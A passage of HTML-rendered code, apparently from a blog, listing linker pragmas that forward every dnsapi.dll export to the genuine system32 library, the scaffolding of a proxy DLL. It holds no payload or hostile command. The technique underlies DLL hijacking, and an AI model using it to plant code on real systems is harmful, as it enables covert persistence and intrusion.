class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:BreakRecordsIntoBlob=c:\windows\system32\dnsapi.BreakRecordsIntoBlob&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:CombineRecordsInBlob=c:\windows\system32\dnsapi.CombineRecordsInBlob&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsAcquireContextHandle_A=c:\windows\system32\dnsapi.DnsAcquireContextHandle_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsAcquireContextHandle_W=c:\windows\system32\dnsapi.DnsAcquireContextHandle_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsAllocateRecord=c:\windows\system32\dnsapi.DnsAllocateRecord&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsApiAlloc=c:\windows\system32\dnsapi.DnsApiAlloc&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsApiAllocZero=c:\windows\system32\dnsapi.DnsApiAllocZero&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsApiFree=c:\windows\system32\dnsapi.DnsApiFree&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsApiHeapReset=c:\windows\system32\dnsapi.DnsApiHeapReset&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsApiRealloc=c:\windows\system32\dnsapi.DnsApiRealloc&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsApiSetDebugGlobals=c:\windows\system32\dnsapi.DnsApiSetDebugGlobals&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsAsyncRegisterHostAddrs=c:\windows\system32\dnsapi.DnsAsyncRegisterHostAddrs&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsAsyncRegisterInit=c:\windows\system32\dnsapi.DnsAsyncRegisterInit&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsAsyncRegisterTerm=c:\windows\system32\dnsapi.DnsAsyncRegisterTerm&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsCopyStringEx=c:\windows\system32\dnsapi.DnsCopyStringEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsCreateReverseNameStringForIpAddress=c:\windows\system32\dnsapi.DnsCreateReverseNameStringForIpAddress&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsCreateStandardDnsNameCopy=c:\windows\system32\dnsapi.DnsCreateStandardDnsNameCopy&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsCreateStringCopy=c:\windows\system32\dnsapi.DnsCreateStringCopy&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpRegisterAddrs=c:\windows\system32\dnsapi.DnsDhcpRegisterAddrs&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpRegisterHostAddrs=c:\windows\system32\dnsapi.DnsDhcpRegisterHostAddrs&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpRegisterInit=c:\windows\system32\dnsapi.DnsDhcpRegisterInit&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpRegisterTerm=c:\windows\system32\dnsapi.DnsDhcpRegisterTerm&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpRemoveRegistrations=c:\windows\system32\dnsapi.DnsDhcpRemoveRegistrations&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpSrvRegisterHostAddr=c:\windows\system32\dnsapi.DnsDhcpSrvRegisterHostAddr&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpSrvRegisterHostAddrEx=c:\windows\system32\dnsapi.DnsDhcpSrvRegisterHostAddrEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpSrvRegisterHostName=c:\windows\system32\dnsapi.DnsDhcpSrvRegisterHostName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpSrvRegisterHostNameEx=c:\windows\system32\dnsapi.DnsDhcpSrvRegisterHostNameEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpSrvRegisterInit=c:\windows\system32\dnsapi.DnsDhcpSrvRegisterInit&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpSrvRegisterInitialize=c:\windows\system32\dnsapi.DnsDhcpSrvRegisterInitialize&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDhcpSrvRegisterTerm=c:\windows\system32\dnsapi.DnsDhcpSrvRegisterTerm&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsDowncaseDnsNameLabel=c:\windows\system32\dnsapi.DnsDowncaseDnsNameLabel&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsExtractRecordsFromMessage_UTF8=c:\windows\system32\dnsapi.DnsExtractRecordsFromMessage_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsExtractRecordsFromMessage_W=c:\windows\system32\dnsapi.DnsExtractRecordsFromMessage_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFindAuthoritativeZone=c:\windows\system32\dnsapi.DnsFindAuthoritativeZone&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFlushResolverCache=c:\windows\system32\dnsapi.DnsFlushResolverCache&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFlushResolverCacheEntry_A=c:\windows\system32\dnsapi.DnsFlushResolverCacheEntry_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFlushResolverCacheEntry_UTF8=c:\windows\system32\dnsapi.DnsFlushResolverCacheEntry_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFlushResolverCacheEntry_W=c:\windows\system32\dnsapi.DnsFlushResolverCacheEntry_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFree=c:\windows\system32\dnsapi.DnsFree&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFreeConfigStructure=c:\windows\system32\dnsapi.DnsFreeConfigStructure&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFreePolicyConfig=c:\windows\system32\dnsapi.DnsFreePolicyConfig&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsFreeProxyName=c:\windows\system32\dnsapi.DnsFreeProxyName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetBufferLengthForStringCopy=c:\windows\system32\dnsapi.DnsGetBufferLengthForStringCopy&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetCacheDataTable=c:\windows\system32\dnsapi.DnsGetCacheDataTable&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetDnsServerList=c:\windows\system32\dnsapi.DnsGetDnsServerList&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetDomainName=c:\windows\system32\dnsapi.DnsGetDomainName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetLastFailedUpdateInfo=c:\windows\system32\dnsapi.DnsGetLastFailedUpdateInfo&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetPolicyTableInfo=c:\windows\system32\dnsapi.DnsGetPolicyTableInfo&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetPolicyTableInfoPrivate=c:\windows\system32\dnsapi.DnsGetPolicyTableInfoPrivate&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetPrimaryDomainName_A=c:\windows\system32\dnsapi.DnsGetPrimaryDomainName_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetProxyInfoPrivate=c:\windows\system32\dnsapi.DnsGetProxyInfoPrivate&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGetProxyInformation=c:\windows\system32\dnsapi.DnsGetProxyInformation&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsGlobals=c:\windows\system32\dnsapi.DnsGlobals&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsIpv6AddressToString=c:\windows\system32\dnsapi.DnsIpv6AddressToString&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsIpv6StringToAddress=c:\windows\system32\dnsapi.DnsIpv6StringToAddress&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsIsAMailboxType=c:\windows\system32\dnsapi.DnsIsAMailboxType&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsIsStatusRcode=c:\windows\system32\dnsapi.DnsIsStatusRcode&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsIsStringCountValidForTextType=c:\windows\system32\dnsapi.DnsIsStringCountValidForTextType&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsLogEvent=c:\windows\system32\dnsapi.DnsLogEvent&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsLogIn=c:\windows\system32\dnsapi.DnsLogIn&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsLogInit=c:\windows\system32\dnsapi.DnsLogInit&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsLogIt=c:\windows\system32\dnsapi.DnsLogIt&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsLogOut=c:\windows\system32\dnsapi.DnsLogOut&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsLogTime=c:\windows\system32\dnsapi.DnsLogTime&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsMapRcodeToStatus=c:\windows\system32\dnsapi.DnsMapRcodeToStatus&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsModifyRecordsInSet_A=c:\windows\system32\dnsapi.DnsModifyRecordsInSet_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsModifyRecordsInSet_UTF8=c:\windows\system32\dnsapi.DnsModifyRecordsInSet_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsModifyRecordsInSet_W=c:\windows\system32\dnsapi.DnsModifyRecordsInSet_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCompareEx_A=c:\windows\system32\dnsapi.DnsNameCompareEx_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCompareEx_UTF8=c:\windows\system32\dnsapi.DnsNameCompareEx_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCompareEx_W=c:\windows\system32\dnsapi.DnsNameCompareEx_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCompare_A=c:\windows\system32\dnsapi.DnsNameCompare_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCompare_UTF8=c:\windows\system32\dnsapi.DnsNameCompare_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCompare_W=c:\windows\system32\dnsapi.DnsNameCompare_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCopy=c:\windows\system32\dnsapi.DnsNameCopy&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNameCopyAllocate=c:\windows\system32\dnsapi.DnsNameCopyAllocate&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNetworkInfo_CreateFromFAZ=c:\windows\system32\dnsapi.DnsNetworkInfo_CreateFromFAZ&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNetworkInformation_CreateFromFAZ=c:\windows\system32\dnsapi.DnsNetworkInformation_CreateFromFAZ&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNotifyResolver=c:\windows\system32\dnsapi.DnsNotifyResolver&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNotifyResolverClusterIp=c:\windows\system32\dnsapi.DnsNotifyResolverClusterIp&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsNotifyResolverEx=c:\windows\system32\dnsapi.DnsNotifyResolverEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQueryConfig=c:\windows\system32\dnsapi.DnsQueryConfig&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQueryConfigAllocEx=c:\windows\system32\dnsapi.DnsQueryConfigAllocEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQueryConfigDword=c:\windows\system32\dnsapi.DnsQueryConfigDword&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQueryExA=c:\windows\system32\dnsapi.DnsQueryExA&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQueryExUTF8=c:\windows\system32\dnsapi.DnsQueryExUTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQueryExW=c:\windows\system32\dnsapi.DnsQueryExW&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQuery_A=c:\windows\system32\dnsapi.DnsQuery_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQuery_UTF8=c:\windows\system32\dnsapi.DnsQuery_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsQuery_W=c:\windows\system32\dnsapi.DnsQuery_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordBuild_UTF8=c:\windows\system32\dnsapi.DnsRecordBuild_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordBuild_W=c:\windows\system32\dnsapi.DnsRecordBuild_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordCompare=c:\windows\system32\dnsapi.DnsRecordCompare&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordCopyEx=c:\windows\system32\dnsapi.DnsRecordCopyEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordListFree=c:\windows\system32\dnsapi.DnsRecordListFree&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordSetCompare=c:\windows\system32\dnsapi.DnsRecordSetCompare&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordSetCopyEx=c:\windows\system32\dnsapi.DnsRecordSetCopyEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordSetDetach=c:\windows\system32\dnsapi.DnsRecordSetDetach&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordStringForType=c:\windows\system32\dnsapi.DnsRecordStringForType&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordStringForWritableType=c:\windows\system32\dnsapi.DnsRecordStringForWritableType&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRecordTypeForName=c:\windows\system32\dnsapi.DnsRecordTypeForName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRegisterClusterAddress=c:\windows\system32\dnsapi.DnsRegisterClusterAddress&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsReleaseContextHandle=c:\windows\system32\dnsapi.DnsReleaseContextHandle&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsRemoveRegistrations=c:\windows\system32\dnsapi.DnsRemoveRegistrations&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsReplaceRecordSetA=c:\windows\system32\dnsapi.DnsReplaceRecordSetA&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsReplaceRecordSetUTF8=c:\windows\system32\dnsapi.DnsReplaceRecordSetUTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsReplaceRecordSetW=c:\windows\system32\dnsapi.DnsReplaceRecordSetW&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsResolverOp=c:\windows\system32\dnsapi.DnsResolverOp&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsScreenLocalAddrsForRegistration=c:\windows\system32\dnsapi.DnsScreenLocalAddrsForRegistration&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsSetConfigDword=c:\windows\system32\dnsapi.DnsSetConfigDword&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsStatusString=c:\windows\system32\dnsapi.DnsStatusString&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsStringCopyAllocateEx=c:\windows\system32\dnsapi.DnsStringCopyAllocateEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsTraceServerConfig=c:\windows\system32\dnsapi.DnsTraceServerConfig&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsUnicodeToUtf8=c:\windows\system32\dnsapi.DnsUnicodeToUtf8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsUpdate=c:\windows\system32\dnsapi.DnsUpdate&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsUpdateMachinePresence=c:\windows\system32\dnsapi.DnsUpdateMachinePresence&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsUpdateTest_A=c:\windows\system32\dnsapi.DnsUpdateTest_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsUpdateTest_UTF8=c:\windows\system32\dnsapi.DnsUpdateTest_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsUpdateTest_W=c:\windows\system32\dnsapi.DnsUpdateTest_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsUtf8ToUnicode=c:\windows\system32\dnsapi.DnsUtf8ToUnicode&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateNameOrIp_TempW=c:\windows\system32\dnsapi.DnsValidateNameOrIp_TempW&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateName_A=c:\windows\system32\dnsapi.DnsValidateName_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateName_UTF8=c:\windows\system32\dnsapi.DnsValidateName_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateName_W=c:\windows\system32\dnsapi.DnsValidateName_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateServerArray_A=c:\windows\system32\dnsapi.DnsValidateServerArray_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateServerArray_W=c:\windows\system32\dnsapi.DnsValidateServerArray_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateServerStatus=c:\windows\system32\dnsapi.DnsValidateServerStatus&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateServer_A=c:\windows\system32\dnsapi.DnsValidateServer_A&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateServer_W=c:\windows\system32\dnsapi.DnsValidateServer_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsValidateUtf8Byte=c:\windows\system32\dnsapi.DnsValidateUtf8Byte&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsWriteQuestionToBuffer_UTF8=c:\windows\system32\dnsapi.DnsWriteQuestionToBuffer_UTF8&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsWriteQuestionToBuffer_W=c:\windows\system32\dnsapi.DnsWriteQuestionToBuffer_W&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:DnsWriteReverseNameStringForIpAddress=c:\windows\system32\dnsapi.DnsWriteReverseNameStringForIpAddress&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_AddRecordsToMessage=c:\windows\system32\dnsapi.Dns_AddRecordsToMessage&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_AllocateMsgBuf=c:\windows\system32\dnsapi.Dns_AllocateMsgBuf&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_BuildPacket=c:\windows\system32\dnsapi.Dns_BuildPacket&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_CleanupWinsock=c:\windows\system32\dnsapi.Dns_CleanupWinsock&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_CloseConnection=c:\windows\system32\dnsapi.Dns_CloseConnection&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_CloseSocket=c:\windows\system32\dnsapi.Dns_CloseSocket&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_CreateMulticastSocket=c:\windows\system32\dnsapi.Dns_CreateMulticastSocket&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_CreateSocket=c:\windows\system32\dnsapi.Dns_CreateSocket&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_CreateSocketEx=c:\windows\system32\dnsapi.Dns_CreateSocketEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_ExtractRecordsFromMessage=c:\windows\system32\dnsapi.Dns_ExtractRecordsFromMessage&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_FindAuthoritativeZoneLib=c:\windows\system32\dnsapi.Dns_FindAuthoritativeZoneLib&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_FreeMsgBuf=c:\windows\system32\dnsapi.Dns_FreeMsgBuf&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_GetRandomXid=c:\windows\system32\dnsapi.Dns_GetRandomXid&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_InitializeMsgBuf=c:\windows\system32\dnsapi.Dns_InitializeMsgBuf&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_InitializeMsgRemoteSockaddr=c:\windows\system32\dnsapi.Dns_InitializeMsgRemoteSockaddr&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_InitializeWinsock=c:\windows\system32\dnsapi.Dns_InitializeWinsock&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_OpenTcpConnectionAndSend=c:\windows\system32\dnsapi.Dns_OpenTcpConnectionAndSend&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_ParseMessage=c:\windows\system32\dnsapi.Dns_ParseMessage&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_ParsePacketRecord=c:\windows\system32\dnsapi.Dns_ParsePacketRecord&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_PingAdapterServers=c:\windows\system32\dnsapi.Dns_PingAdapterServers&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_ReadPacketName=c:\windows\system32\dnsapi.Dns_ReadPacketName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_ReadPacketNameAllocate=c:\windows\system32\dnsapi.Dns_ReadPacketNameAllocate&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_ReadRecordStructureFromPacket=c:\windows\system32\dnsapi.Dns_ReadRecordStructureFromPacket&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_RecvTcp=c:\windows\system32\dnsapi.Dns_RecvTcp&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_ResetNetworkInfo=c:\windows\system32\dnsapi.Dns_ResetNetworkInfo&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_SendAndRecvUdp=c:\windows\system32\dnsapi.Dns_SendAndRecvUdp&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_SendEx=c:\windows\system32\dnsapi.Dns_SendEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_SetRecordDatalength=c:\windows\system32\dnsapi.Dns_SetRecordDatalength&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_SetRecordsSection=c:\windows\system32\dnsapi.Dns_SetRecordsSection&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_SetRecordsTtl=c:\windows\system32\dnsapi.Dns_SetRecordsTtl&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_SkipPacketName=c:\windows\system32\dnsapi.Dns_SkipPacketName&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_SkipToRecord=c:\windows\system32\dnsapi.Dns_SkipToRecord&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_UpdateLib=c:\windows\system32\dnsapi.Dns_UpdateLib&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_UpdateLibEx=c:\windows\system32\dnsapi.Dns_UpdateLibEx&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_WriteDottedNameToPacket=c:\windows\system32\dnsapi.Dns_WriteDottedNameToPacket&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_WriteQuestionToMessage=c:\windows\system32\dnsapi.Dns_WriteQuestionToMessage&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(linker,&quot;/EXPORT:Dns_WriteRecordStructureToPacketEx=c:\windows\system32\dnsapi.Dns_WriteRecordStructureToPacketEx&quot;)</span></span><br><span class="line"><span 